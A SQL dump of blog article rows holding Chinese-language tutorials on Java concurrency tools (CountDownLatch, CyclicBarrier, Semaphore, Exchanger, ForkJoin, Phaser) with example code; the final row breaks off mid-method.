INSERT INTO `article` VALUES (111, 1, 'CountDownLatch与CyclicBarrier-JUC', '2019/10/1570976054_mmexport1570975455479.jpg', '### 概况\n#### CountDownLatch应用场景\n1. 主线程等待所有子线程任务完成\n2. A线程等待B线程做完某操作后继续执行\n3. 多个线程共同执行一阶段任务后再共同执行下一阶段任务,反复;实现较为繁琐\n\n#### CyclicBarrier应用场景\n1. 多个线程相互等待直到所有线程任务完成\n2. 像CountDownLatch一样等待所有子线程任务完成,但运用了回调事件通知\n\n#### CountDownLatch与CyclicBarrier区别\n1. CountDownLatch不能reset,而CyclicBarrier是可以循环使用的\n2. CyclicBarrier中工作线程之间互相等待,没有中间人进行await,去中心化\n3. CountDownLatch需要一个线程执行await进行任务完成操作\n\n### CountDownLatch\n#### CountDownLatch\n1. 一个线程或多个线程一直等待,直到其他线程完成的操作完成\n2. CountDownLatch用了一个*给定的计数器来进行初始化*,该计数器的操作是*原子操作*,同时只能有一个线程去操作该计数器\n3. 调用该类await方法的线程会一直处于阻塞状态,直到其他线程调用*countDown*方法使当前计数器的值*变成0*\n4. 每次调用*countDown的时候,计数器的值会减一*\n5. 到计数器的值*减到0的时候*,所有因调用*await*的方法而处于等待状态的线程就会继续往下执行\n6. 这种操作只会出现一次,因为这里的计数器是*不能重置的*\n7. 如果业务上需要一个可以重置计数次数的版本,可以考虑*CyclicBarrier*\n\n#### 注意\n1. 使用时给定计数器\n2. 每次线程执行完时调用*countDown*\n3. 并发模拟可以使用CountDownLatch,因为模拟的场景是有5000个请求,每一个分别去执行一个函数,需要等待所有处理的请求处理完再统一它的结果\n4. 这个结果对应于我们演示时的最终结果,使用CountDownLatch就可以保证这些处理全部处理完才去输出最终的结果\n5. *过程中每一个请求都可以看作一个子任务* \n\n#### 应用场景\n1. 主线程等待线程池中所有子线程任务完成\n2. A线程等待B线程做完某操作后继续执行\n3. 多个线程共同执行一阶段任务后再共同执行下一阶段任务,反复;实现较为繁琐\n\n#### 主线程等待线程池中所有子线程任务完成\n```java\n/**\n * 应用场景\n * 主线程等待线程池中所有子线程任务完成\n */\npublic class CountDownLatchExample1 {\n\n    private static Random random = new Random(System.currentTimeMillis());\n\n    private static ExecutorService executor = Executors.newFixedThreadPool(2);\n\n    private static final CountDownLatch latch = new CountDownLatch(10);\n\n    public static void main(String[] args) throws InterruptedException {\n        int[] data = query();\n        for (int i = 0; i < data.length; i++) {\n            executor.execute(new SimpleRunnable(data, i, latch));\n        }\n        // 阻塞等待所有任务完成,直到CountDownLatch到达0,表示所有线程任务完成\n        latch.await();\n        System.out.println(\"all of work finish done.\");\n        executor.shutdown(); // shutdown方法是异步的\n        executor.awaitTermination(1, TimeUnit.HOURS);// Blocks,直到线程池所有任务完成或超时\n    }\n\n    static class SimpleRunnable implements Runnable {\n\n        private final int[] data;\n\n        private final int index;\n\n        private final CountDownLatch latch;\n\n        SimpleRunnable(int[] data, int index, CountDownLatch latch) {\n            this.data = data;\n            this.index = index;\n            this.latch = latch;\n        }\n\n        @Override\n        public void run() {\n            try {\n                Thread.sleep(random.nextInt(2_000));\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            int value = data[index];\n            if (value % 2 == 0) {\n                data[index] = value * 2;\n            } else {\n                data[index] = value * 10;\n            }\n            System.out.println(Thread.currentThread().getName()+ \"finished.\");\n            // 线程任务完成是进行countDown,每次调用countDown(),CountDownLatch的计数减1\n            latch.countDown();\n        }\n    }\n\n    private static int[] query() {\n        return new int[]{1, 2, 3, 4, 5, 6, 7, 8, 9, 10};\n    }\n}\n```\n#### A线程等待B线程做完某操作后继续执行\n```java\n/**\n * 应用场景\n *  A线程等待B线程做完某操作后继续执行\n */\npublic class CountDownLatchExample2 {\n    public static void main(String[] args) throws InterruptedException {\n        final CountDownLatch latch = new CountDownLatch(1);\n\n        new Thread() {\n            @Override\n            public void run() {\n                System.out.println(\"Do some initial working.\");\n                try {\n                    Thread.sleep(1_000);\n                    latch.await();\n                    System.out.println(\"Do other working..\");\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n        }.start();\n\n        new Thread() {\n            @Override\n            public void run() {\n                try {\n                    System.out.println(\"async prepare for some data.\");\n                    Thread.sleep(2_000);\n                    System.out.println(\"data prepare for done.\");\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } finally {\n                    latch.countDown();\n                }\n            }\n        }.start();\n\n        new Thread() {\n            @Override\n            public void run() {\n                try {\n                    latch.await();\n                    System.out.println(\"release.\");\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n        }.start();\n\n        Thread.currentThread().join();\n    }\n}\n```\n#### 多个线程共同执行一阶段任务后再共同执行下一阶段任务,反复\n```java\n/**\n * 应用场景\n *  多个线程共同执行一阶段任务后再共同执行下一阶段任务,反复\n */\npublic class CountDownLatchExample4 {\n\n    private static Random random = new Random(System.currentTimeMillis());\n\n    static class Event{\n        int id = 0;\n        public Event(int id) {\n            this.id = id;\n        }\n    }\n\n    interface Watcher {\n        // void startWatch();\n\n        void done(Table table);\n    }\n\n    static class TaskBatch implements Watcher{\n\n        private CountDownLatch countDownLatch;\n\n        private TaskGroup taskGroup;\n\n        public TaskBatch(int size, TaskGroup taskGroup) {\n            this.taskGroup = taskGroup;\n            this.countDownLatch = new CountDownLatch(size);\n        }\n\n        /*@Override\n        public void startWatch() {\n            countDownLatch.countDown();\n        }*/\n\n        @Override\n        public void done(Table table) {\n            countDownLatch.countDown();\n            if (countDownLatch.getCount() == 0) {\n                System.out.println(\"The table \" + table.tableName + \" finished work;{\"+ table +\"}\");\n                taskGroup.done(table);\n            }\n        }\n    }\n\n    static class TaskGroup implements Watcher {\n        private CountDownLatch countDownLatch;\n\n        private Event event;\n\n        public TaskGroup(int size, Event e) {\n            this.event = e;\n            this.countDownLatch = new CountDownLatch(size);\n        }\n\n        @Override\n        public void done(Table table) {\n            countDownLatch.countDown();\n            if (countDownLatch.getCount() == 0) {\n                System.out.println(\"=======All of table done in event:\" + event.id);\n            }\n        }\n    }\n\n    static class Table {\n        String tableName;\n        long sourceRecordCount = 10;\n        long targetCount;\n        String sourceColumnSchema = \"<table name=\'a\'><column name=\'col1\' type=\'varchar2\'></column></table>\";\n        String targetColumnSchema = \"\";\n\n        public Table(String tableName, long sourceRecordCount) {\n            this.tableName = tableName;\n            this.sourceRecordCount = sourceRecordCount;\n        }\n\n        @Override\n        public String toString() {\n            return \"Table{\" +\n                    \"tableName=\'\" + tableName + \'\\\'\' +\n                    \", sourceRecordCount=\" + sourceRecordCount +\n                    \", targetCount=\" + targetCount +\n                    \", sourceColumnSchema=\'\" + sourceColumnSchema + \'\\\'\' +\n                    \", targetColumnSchema=\'\" + targetColumnSchema + \'\\\'\' +\n                    \'}\';\n        }\n    }\n\n    private static List<Table> capture(Event event) {\n        ArrayList<Table> list = new ArrayList<>();\n        for (int i = 0; i < 10; i++) {\n            list.add(new Table(\"table-\"+event.id + \"-\" + i, i * 1000));\n        }\n        return list;\n    }\n\n    public static void main(String[] args) {\n        Event[] events = {new Event(1), new Event(2)};\n        ExecutorService executorService = Executors.newFixedThreadPool(5);\n        for (Event event : events) {\n            List<Table> tables = capture(event);\n            TaskGroup taskGroup = new TaskGroup(tables.size(), event);\n            for(Table table : tables) {\n                TaskBatch taskBatch = new TaskBatch(2, taskGroup);\n                TrustSourceColumns columnsRunnable = new TrustSourceColumns(table, taskBatch);\n                TrustSourceRecordCount recordCountRunnable = new TrustSourceRecordCount(table, taskBatch);\n\n                executorService.submit(columnsRunnable);\n                executorService.submit(recordCountRunnable);\n            }\n        }\n    }\n\n    static class TrustSourceRecordCount implements Runnable {\n        private final Table table;\n        private final TaskBatch taskBatch;\n\n        TrustSourceRecordCount(Table table, TaskBatch taskBatch) {\n            this.table = table;\n            this.taskBatch = taskBatch;\n        }\n        @Override\n        public void run() {\n            try {\n                Thread.sleep(random.nextInt(10000));\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            table.targetCount = table.sourceRecordCount;\n            // System.out.println(\"The table \" + table.tableName + \"target record count Capture done and update the data\");\n            taskBatch.done(table);\n        }\n    }\n\n    static class TrustSourceColumns implements Runnable {\n\n        private final Table table;\n\n        private final TaskBatch taskBatch;\n\n        TrustSourceColumns(Table table, TaskBatch taskBatch) {\n            this.table = table;\n            this.taskBatch = taskBatch;\n        }\n\n        @Override\n        public void run() {\n            try {\n                Thread.sleep(random.nextInt(10000));\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            table.targetColumnSchema = table.sourceColumnSchema;\n            // System.out.println(\"The table \" + table.tableName + \"target columns Capture done and update the data\");\n            taskBatch.done(table);\n        }\n    } \n}\n```\n\n### CyclicBarrier\n#### CyclicBarrier\n1. 它允许一组线程相互等待,直到某个公共的屏障点\n2. 通过它可以完成多个线程之间相互等待只有当每个线程都准备就绪,才能各自继续往下执行后续的操作\n3. 它和CountDownLatch有些相似的地方,都是通过*计数器实现*的\n4. 当某个线程调用了await方法时,这个线程就进入了等待状态,计数器执行时*+1*,(这点和countDown相反)\n5. 当前计数器值*达到初始值的时候*,因为调用await进入等待状态的线程会被唤醒继续执行它们后续的操作\n6. 由于CyclicBarrier在释放等待线程后可以被重用,所以又*称它为循环屏障*,可以一直循环使用\n\n#### 应用场景\n1. 多个线程相互等待直到所有线程任务完成\n2. 像CountDownLatch一样等待所有子线程任务完成,但运用了回调事件通知\n\n\n#### 多个线程相互等待直到所有线程任务完成\n```java\n/**\n * 应用场景\n *  多个线程相互等待直到所有线程任务完成\n * */\npublic class CyclicBarrierExample1 {\n    public static void main(String[] args) throws BrokenBarrierException, InterruptedException {\n        CyclicBarrier cyclicBarrier = new CyclicBarrier(2, new Runnable(){\n            // 当Parties满足时调用,可以实现像CountDownLatch一样等待所有子线程任务完成,但运用了回调事件通知\n            @Override\n            public void run() {\n                System.out.println(\"callback all of finish\");\n            }\n        });\n        new Thread() {\n            @Override\n            public void run() {\n                try {\n                    TimeUnit.SECONDS.sleep(3);\n                    System.out.println(\"T1 finished\");\n                    cyclicBarrier.await();\n                    // cyclicBarrier.await(1, TimeUnit.SECONDS); 等待超时\n                    System.out.println(\"T1 The other thread finished too.\");\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } catch (BrokenBarrierException e) {\n                    e.printStackTrace();\n                }\n            }\n        }.start();\n\n        new Thread() {\n            @Override\n            public void run() {\n                try {\n                    TimeUnit.SECONDS.sleep(6);\n                    System.out.println(\"T2 finished\");\n                    cyclicBarrier.await();\n                    System.out.println(\"T2 The other thread finished too.\");\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } catch (BrokenBarrierException e) {\n                    e.printStackTrace();\n                }\n            }\n        }.start();\n        System.out.println(cyclicBarrier.getNumberWaiting()); // 0->1->0 进入wait等待的线程数量\n        System.out.println(cyclicBarrier.getParties()); // 2 创建时Parties的数量\n        System.out.println(cyclicBarrier.isBroken());// false 某线程cyclicBarrier.await时是否中断或出现等待超时\n        // reset = initial = finished\n        cyclicBarrier.reset(); // 重置,重置后相当于初始化的状态,相当于最终完成的状态,说明CyclicBarrier可以多次重用\n        TimeUnit.MILLISECONDS.sleep(4_000);\n    }\n}\n```', 0, 0, 31, 0, 0, '2019-10-13 22:14:50', '2019-10-16 20:30:01', 0, 0);
INSERT INTO `article` VALUES (112, 1, 'Semaphore-JUC', '2019/10/1571027152_mmexport1570368387400.jpg', '### Semaphore\n#### Semaphore\n1. *信号量*可以*控制并发访问的线程个数*\n2. 在操作系统里信号量在进程控制方面有重要的应用\n3. Semaphore可以很容易的控制某个资源可被*同时访问的个数*\n\n#### 应用场景\n1. 控制同时访问的线程数\n2. 实现同步显式锁\n\n#### 控制同时访问的线程数\n```java\n/**\n * 应用场景\n *  控制同时访问的线程数\n */\npublic class SemaphoreExample2 {\n\n    public static void main(String[] args) throws InterruptedException {\n        // 允许的最大线程数锁 许可证2个\n        final Semaphore semaphore = new Semaphore(2);\n        for (int i = 0; i < 3; i++) {\n            new Thread() {\n                @Override\n                public void run() {\n                    System.out.println(Thread.currentThread().getName() + \"in\");\n                    try {\n                        semaphore.acquire(1);\n                        System.out.println(Thread.currentThread().getName() + \" Get the semaphore\");\n                        TimeUnit.SECONDS.sleep(5);\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    } finally {\n                        semaphore.release(1);\n                    }\n                    System.out.println(Thread.currentThread().getName() + \"out\");\n                }\n            }.start();\n        }\n        while (true) {\n            System.out.println(\"AP->\" + semaphore.availablePermits()); // 剩余的permits\n            System.out.println(\"QL->\" + semaphore.getQueueLength()); // 评估值 有几个acquire中的线程\n            System.out.println(\"========\");\n            TimeUnit.SECONDS.sleep(1);\n        }\n    }\n}\n```\n\n#### 实现同步显式锁\n```java\n/**\n * 应用场景\n *  实现同步显式锁\n */\npublic class SemaphoreExample1 {\n    public static void main(String[] args) {\n        final SemaphoreLock lock = new SemaphoreLock();\n\n        for (int i = 0; i < 2; i++) {\n            new Thread() {\n                @Override\n                public void run() {\n                    try {\n                        System.out.println(Thread.currentThread().getName() + \" is Running\");\n                        lock.lock();\n                        System.out.println(Thread.currentThread().getName() + \" get the #SemaphoreLock\");\n                        TimeUnit.SECONDS.sleep(10);\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    } finally {\n                        lock.unlock();\n                    }\n                    System.out.println(Thread.currentThread().getName() + \" Released the #SemaphoreLock\");\n                }\n            }.start();\n        }\n    }\n\n    static class SemaphoreLock {\n        private final Semaphore semaphore = new Semaphore(1);\n\n        public void lock() throws InterruptedException {\n            semaphore.acquire();\n        }\n\n        public void unlock() {\n            semaphore.release();\n        }\n    }\n\n    private synchronized static void m() {\n        try {\n            TimeUnit.SECONDS.sleep(10);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n#### 不可被打断,获取信号量(许可证)时\n```java\n/**\n * 不可被打断,获取信号量(许可证)时\n */\npublic class SemaphoreExample3 {\n    public static void main(String[] args) throws InterruptedException {\n        final Semaphore semaphore = new Semaphore(1);\n        Thread t1 = new Thread() {\n            @Override\n            public void run() {\n                try {\n                    semaphore.acquire();\n                    System.out.println(\"into t1\");\n                    TimeUnit.SECONDS.sleep(10);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } finally {\n                    semaphore.release();\n                }\n                System.out.println(\"T1 finished\");\n            }\n        };\n        t1.start();\n\n        TimeUnit.MILLISECONDS.sleep(50);\n\n        Thread t2 = new Thread() {\n            @Override\n            public void run() {\n                try {\n                    // semaphore.acquire(); //可以被中断\n                    semaphore.acquireUninterruptibly(); // 不可被中断\n                }  finally {\n                    semaphore.release();\n                }\n                System.out.println(\"T2 finished\");\n            }\n        };\n        t2.start();\n        TimeUnit.MILLISECONDS.sleep(50);\n        t2.interrupt();// 尝试中断t2\n        System.out.println(\"=====\");\n    }\n}\n```\n#### api\n```java\n/**\n * api\n * {@link Semaphore#drainPermits()} 把许可证全部获取\n * {@link Semaphore#availablePermits()} 当前可用的许可证数量\n * {@link Semaphore#tryAcquire()} 时间内,尝试获取许可证,获取成功返回true\n * {@link Semaphore#hasQueuedThreads()} 等待队列中是否有线程\n * {@link Semaphore#getQueuedThreads()} 获取等待队列中的线程集合\n */\npublic class SemaphoreExample4 {\n    public static void main(String[] args) throws InterruptedException {\n        final MySemaphore semaphore = new MySemaphore(5);\n        Thread t1 = new Thread(\"t1\") {\n            @Override\n            public void run() {\n                try {\n                    semaphore.drainPermits(); // 把许可证全部获取\n                    System.out.println(semaphore.availablePermits()); // 当前可用的许可证数量\n                    TimeUnit.SECONDS.sleep(5);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } finally {\n                    semaphore.release(5);\n                }\n                System.out.println(\"T1 finished\");\n            }\n        };\n        t1.start();\n\n        TimeUnit.MILLISECONDS.sleep(500);\n\n        Thread t2 = new Thread(\"t2\") {\n            @Override\n            public void run() {\n                try {\n                    // semaphore.acquire();\n                    boolean success = semaphore.tryAcquire(1, TimeUnit.SECONDS);// 时间内,尝试获取许可证,获取成功返回true\n                    System.out.println(success ? \"Successful\":\"Failure\");\n                    TimeUnit.SECONDS.sleep(2);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } finally {\n                    semaphore.release();\n                }\n                System.out.println(\"T2 finished\");\n            }\n        };\n        t2.start();\n\n        TimeUnit.MILLISECONDS.sleep(500);\n        System.out.println(semaphore.hasQueuedThreads()); // 等待队列中是否有线程\n        Collection<Thread> waitingThreads = semaphore.getWaitingThreads(); // 等待队列中的线程集合\n        for (Thread t : waitingThreads) {\n            System.out.println(\"waitThread: \" + t.getName()); // t2\n        }\n    }\n\n    static class MySemaphore extends Semaphore {\n\n        public MySemaphore(int permits) {\n            super(permits);\n        }\n\n        public MySemaphore(int permits, boolean fair) {\n            super(permits, fair);\n            super.getQueuedThreads();\n        }\n\n        public Collection<Thread> getWaitingThreads() {\n            return super.getQueuedThreads();\n        }\n    }\n}\n```', 0, 0, 31, 0, 0, '2019-10-14 12:26:01', '2019-10-16 20:28:21', 0, 0);
INSERT INTO `article` VALUES (113, 1, 'Exchanger-JUC', '2019/10/1571029825_mmexport1570975300426.jpg', '### Exchanger\n#### Exchanger\n1. 可以在对中对元素进行配对和交换的线程的同步点。每个线程将条目上的某个方法呈现给 exchange 方法，与伙伴线程进行匹配，并且在返回时接收其伙伴的对象\n2. Exchanger 可能在应用程序（比如遗传算法和管道设计）中很有用\n3. 它允许在并发任务之间交换数据。具体来说，Exchanger类允许在两个线程之间定义同步点。当两个线程都到达同步点时，他们交换数据结构，因此第一个线程的数据结构进入到第二个线程中，第二个线程的数据结构进入到第一个线程中\n\n#### 注意\n1. 如果线对线程未到达更改点，则该线程将被阻塞,这会导致一个线程崩溃后,另一个线程会一直处于等待阻塞\n2. 使用Exchanger必须配对\n3. 操作同一对象时注意线程安全\n\n#### 应用场景\n1. 两个线程互为搭档进行传递通讯\n\n#### 两个线程互为搭档进行传递通讯\n```java\n/**\n * 应用场景\n *  两个线程互为搭档进行传递通讯\n */\npublic class ExchangerExample1 {\n    /**\n     * V r = exchange(V v)\n     *      v: indicate the object the current thread wanted transfer 指示当前线程要传输的对象\n     *      r: indicate the other thread(pair) return object 另一个线程（对）返回对象\n     * <pre>\n     *     Note:\n     *      1. if the pair thread not reached change point,the thread will blocked 如果线对线程未到达更改点，则该线程将被阻塞\n     *      2. use the @{@link Exchanger} must be paired  使用{@link Exchanger}必须配对\n     *      3. manipulating the same object thread safe 操作同一对象时注意线程安全\n     * </pre>\n     * @param args\n     */\n    public static void main(String[] args) {\n        final Exchanger<String> exchanger = new Exchanger<String>();\n        new Thread(new Runnable() {\n            @Override\n            public void run() {\n                System.out.println(Thread.currentThread().getName() + \" start.\");\n                try {\n                    String str = \"I am come T-A\";\n                    // 搭档线程的返回值\n                    // String result = exchanger.exchange(\"I am come T-A\", 1, TimeUnit.SECONDS); 超时等待\n                    String result = exchanger.exchange(str);\n                    System.out.println(Thread.currentThread().getName() + \" Get value [\" + result + \"]\");\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                System.out.println(Thread.currentThread().getName() + \" end.\");\n            }\n        }, \"==A==\").start();\n\n        new Thread(new Runnable() {\n            @Override\n            public void run() {\n                System.out.println(Thread.currentThread().getName() + \" start.\");\n                try {\n                    String str = \"I am come T-B\";\n                    TimeUnit.SECONDS.sleep(5);\n                    String result = exchanger.exchange(str);\n                    System.out.println(Thread.currentThread().getName() + \" Get value [\" + result + \"]\");\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                System.out.println(Thread.currentThread().getName() + \" end.\");\n            }\n        }, \"==B==\").start();\n    }\n}\n```', 0, 0, 18, 0, 0, '2019-10-14 13:10:37', '2019-10-16 20:27:57', 0, 0);
INSERT INTO `article` VALUES (114, 1, 'ForkJoin-JUC', '2019/10/1571031388_mmexport1570973957195.jpg', '### ForkJoin\n#### ForkJoin\n1. 它是一个*把大任务分割成若干个小任务*,最终汇总每个小任务结果后得到大任务结果的工具实现类\n2. 它主要采用了*工作窃取算法*,工作切取算法指*某个线程从其他队列里窃取任务来执行*\n3. 通过这种方式充分利用线程它们的运行时间来提高应用程序的性能\n\n#### 应用场景\n1. 将大任务拆分数个小任务最后进行合并结果集\n\n#### 将大任务拆分数个小任务最后进行合并结果集\n```java\n/**\n * 应用场景\n *  将大任务拆分数个小任务最后进行合并结果集\n *  RecursiveTask 有返回值\n */\npublic class ForkJoinRecursiveTask {\n\n    private final static int MAX_THRESHOLD = 300;\n\n    public static void main(String[] args) {\n        final ForkJoinPool forkJoinPool = new ForkJoinPool();\n        ForkJoinTask<Integer> future = forkJoinPool.submit(new CalculatedRecursiveTask(0, 1000));\n        try {\n            Integer result = future.get();\n            System.out.println(result);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } catch (ExecutionException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static class CalculatedRecursiveTask extends RecursiveTask<Integer> {\n\n        private final int start;\n\n        private final int end;\n\n        CalculatedRecursiveTask(int start, int end) {\n            this.start = start;\n            this.end = end;\n        }\n\n        @Override\n        protected Integer compute() {\n            if (end-start <= MAX_THRESHOLD) {\n                return IntStream.rangeClosed(start, end).sum();\n            } else {\n                int middle = (start + end) / 2;\n                CalculatedRecursiveTask leftTask = new CalculatedRecursiveTask(start, middle);\n                CalculatedRecursiveTask rightTask = new CalculatedRecursiveTask(middle + 1, end);\n                leftTask.fork();\n                rightTask.fork();\n                return leftTask.join() + rightTask.join();\n            }\n        }\n    }\n}\n```\n```java\n/**\n * 应用场景\n *  将大任务拆分数个小任务最后进行合并结果集\n *  RecursiveAction 没有返回值\n */\npublic class ForkJoinRecursiveAction {\n\n    private final static int MAX_THRESHOLD = 300;\n\n    private final static AtomicInteger SUM = new AtomicInteger(0);\n\n    public static void main(String[] args) throws InterruptedException {\n        final ForkJoinPool forkJoinPool = new ForkJoinPool();\n        forkJoinPool.submit(new CalculatedRecursiveAction(0, 1000));\n        forkJoinPool.awaitTermination(10, TimeUnit.SECONDS); // 等待任务完成\n        Optional.of(SUM).ifPresent(System.out::println);\n    }\n\n    private static class CalculatedRecursiveAction extends RecursiveAction {\n\n        private final int start;\n\n        private final int end;\n\n        CalculatedRecursiveAction(int start, int end) {\n            this.start = start;\n            this.end = end;\n        }\n\n        @Override\n        protected void compute() {\n            if (end-start <= MAX_THRESHOLD) {\n                SUM.addAndGet(IntStream.rangeClosed(start, end).sum());\n            } else {\n                int middle = (start + end) / 2;\n                CalculatedRecursiveAction leftTask = new CalculatedRecursiveAction(start, middle);\n                CalculatedRecursiveAction rightTask = new CalculatedRecursiveAction(middle + 1, end);\n                leftTask.fork();\n                rightTask.fork();\n            }\n        }\n    }\n}\n```', 0, 0, 17, 0, 0, '2019-10-14 13:36:39', '2019-10-16 20:27:49', 0, 0);
INSERT INTO `article` VALUES (115, 1, 'Phaser-JUC', '2019/10/1571033368_mmexport1570975373967.jpg', '### Phaser\n#### Phaser\n1. 阶段器,它可以实现CountDownLatch的功能,且比CountDownLatch更强大\n2. 它可以动态调整计数器值parties\n2. Phaser将多个线程协作执行的任务划分为多个阶段，每个阶段都可以有任意个参与者，线程可以随时注册并参与到某个阶段或退出注册某个阶段\n\n#### 应用场景\n1. 主线程等待所有子线程任务完成\n2. 多个线程执行分阶段性质的任务,每个阶段结束后停留等待所有线程结束进行统计处理,随后再进行下个阶段任务\n3. 多个子线程执行公共的任务结束后,不进入阻塞,而是通知主线程自己任务完成后,继续执行自己的独立任务\n\n#### 主线程等待所有子线程任务完成\n```java\n/**\n * 应用场景\n *  主线程等待所有子线程任务完成\n *  相比于CountDownLatch,Phaser可以自行调节parties的数量\n *  {@link Phaser#register()} 动态增加parties数量\n *  {@link Phaser#arriveAndAwaitAdvance()} 到达并等待本轮parties满足\n */\npublic class PhaserExample1 {\n\n    private final static Random random = new Random(System.currentTimeMillis());\n\n    public static void main(String[] args) {\n        final Phaser phaser = new Phaser();\n        IntStream.rangeClosed(1, 5).boxed().map(i -> phaser).forEach(Task::new);\n        phaser.register();// 动态增加parties数量\n        phaser.arriveAndAwaitAdvance(); // 最后一个注册最后一个被唤醒等待\n        System.out.println(\"all of worker finished the task.\");\n        // IntStream.rangeClosed(1, 5).boxed().map(i -> phaser).forEach(Task::new);\n    }\n\n    static class Task extends Thread {\n        private final Phaser phaser;\n        Task(Phaser phaser) {\n            this.phaser = phaser;\n            this.phaser.register();\n            start();\n        }\n\n        @Override\n        public void run() {\n            System.out.println(\"The Worker {\" + getName() + \"] is working...\");\n            try {\n                TimeUnit.SECONDS.sleep(random.nextInt(5));\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            phaser.arriveAndAwaitAdvance();\n        }\n    }\n}\n```\n```java\n/**\n * 应用场景\n *  主线程等待所有子线程任务完成\n * {@link Phaser#awaitAdvance(int)} 监视等待着参数phase轮的parties满足\n * {@link Phaser#arrive()} 到达,但不阻塞等待其他线程完成任务\n */\npublic class PhaserExample6 {\n\n    public static void main(String[] args) throws InterruptedException {\n        final Phaser phaser = new Phaser(6);\n        IntStream.rangeClosed(1, 6).boxed().map(i -> phaser).forEach(AwaitAdvanceTask::new); // 6个\n\n        phaser.awaitAdvance(phaser.getPhase()); // 监视等待着目前phase轮的Parties结束\n        System.out.println(\"===================\");\n    }\n\n    private static class AwaitAdvanceTask extends Thread {\n        private final Phaser phaser;\n        AwaitAdvanceTask(Phaser phaser) {\n            this.phaser = phaser;\n            start();\n        }\n\n        @Override\n        public void run() {\n            try {\n                TimeUnit.SECONDS.sleep(5);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println(getName() + \" finished work.\");\n            phaser.arrive(); // 到达\n        }\n    }\n}\n```\n\n#### 多个线程执行分阶段性质的任务,每个阶段结束后停留等待所有线程结束进行统计处理,随后再进行下个阶段任务\n```java\n/**\n * 应用场景\n *  多个线程执行分阶段性质的任务,每个阶段结束后停留等待所有线程结束进行统计处理,随后再进行下个阶段任务\n */\npublic class PhaserExample2 {\n\n    private final static Random random = new Random(System.currentTimeMillis());\n\n    /**\n     * 铁人三项\n     * 1阶段 赛跑 等待所有人结束\n     * 2阶段 骑自行车,等待所有人结束\n     * 3阶段 跳远,等待所有结束\n     * 每当parties满足时,完成一轮phaser,phaser就会+1\n     * running\n     * bicycle\n     * long jump\n     * @param args\n     */\n    public static void main(String[] args) {\n        // 5个parties,5个都到达时完成一轮phaser\n        final Phaser phaser = new Phaser(5) {\n            @Override\n            protected boolean onAdvance(int phase, int registeredParties) {\n                System.err.println(registeredParties);\n                return false;\n            }\n        };\n        for (int i = 1; i < 6; i++) {\n            new Athletes(i, phaser).start();\n        }\n    }\n\n    static class Athletes extends Thread {\n        private final int no;\n        private final Phaser phaser;\n        Athletes(int no, Phaser phaser) {\n            this.no = no;\n            this.phaser = phaser;\n        }\n\n        @Override\n        public void run() {\n            try {\n                System.out.println(no + \": start running...\");\n                TimeUnit.SECONDS.sleep(random.nextInt(5));\n                System.out.println(no + \":  end running\");\n                System.out.println(\"getPhase()=>\" + phaser.getPhase()); // 0\n                phaser.arriveAndAwaitAdvance(); // 到达并等待\n\n\n                System.out.println(no + \": start bicycle.\");\n                TimeUnit.SECONDS.sleep(random.nextInt(5));\n                System.out.println(no + \":  end bicycle\");\n                System.out.println(\"getPhase()=>\" + phaser.getPhase()); // 1\n                phaser.arriveAndAwaitAdvance();\n\n                System.out.println(no + \": start long jump.\");\n                TimeUnit.SECONDS.sleep(random.nextInt(5));\n                System.out.println(no + \":  end long jump\");\n                System.out.println(\"getPhase()=>\" + phaser.getPhase());// 2\n                phaser.arriveAndAwaitAdvance();\n\n                System.out.println(\"finished phase: \" + phaser.getPhase());// 3\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n\n        }\n    }\n}\n```\n```java\n/**\n * 应用场景\n *  多个线程执行分阶段性质的任务,每个阶段结束后停留等待所有线程结束进行统计处理,随后再进行下个阶段任务\n *  特殊情况,某个线程中途崩溃退出或放弃执行下一阶段\n */\npublic class PhaserExample3 {\n    private final static Random random = new Random(System.currentTimeMillis());\n\n    /**\n     * 铁人三项\n     *  某个线程中途出现了异常中断或使不进行下阶段任务\n     *  当某个线程在中途放弃时可以调用 {@link Phaser#arriveAndDeregister()} 到达并退出注册,使parties-1\n     *  这样其他线程就不会等待它,从而进行下一个阶段任务\n     * @param args\n     */\n    public static void main(String[] args) {\n        final Phaser phaser = new Phaser(5);\n        for (int i = 1; i < 5; i++) {\n            new Athletes(i, phaser).start();\n        }\n        new InjuredAthletes(5, phaser).start();\n    }\n\n    static class InjuredAthletes extends Thread {\n        private final int no;\n        private final Phaser phaser;\n        InjuredAthletes(int no, Phaser phaser) {\n            this.no = no;\n            this.phaser = phaser;\n        }\n\n        @Override\n        public void run() {\n            try {\n                sport(no, phaser, \": start running...\", \":  end running\");\n\n\n                sport(no, phaser, \": start bicycle.\", \":  end bicycle\");\n\n                System.out.println(no + \" Oh shit, i am injured, i will be exited.\");\n                phaser.arriveAndDeregister(); //达到并退出注册 当前线程不进行下一阶段任务了\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    static class Athletes extends Thread {\n        private final int no;\n        private final Phaser phaser;\n        Athletes(int no, Phaser phaser) {\n            this.no = no;\n            this.phaser = phaser;\n        }\n\n        @Override\n        public void run() {\n            try {\n                sport(no, phaser, \": start running...\", \":  end running\");\n\n\n                sport(no, phaser, \": start bicycle.\", \":  end bicycle\");\n\n                sport(no, phaser, \": start long jump.\", \":  end long jump\");\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n    private static void sport(int no, Phaser phaser, String s, String s2) 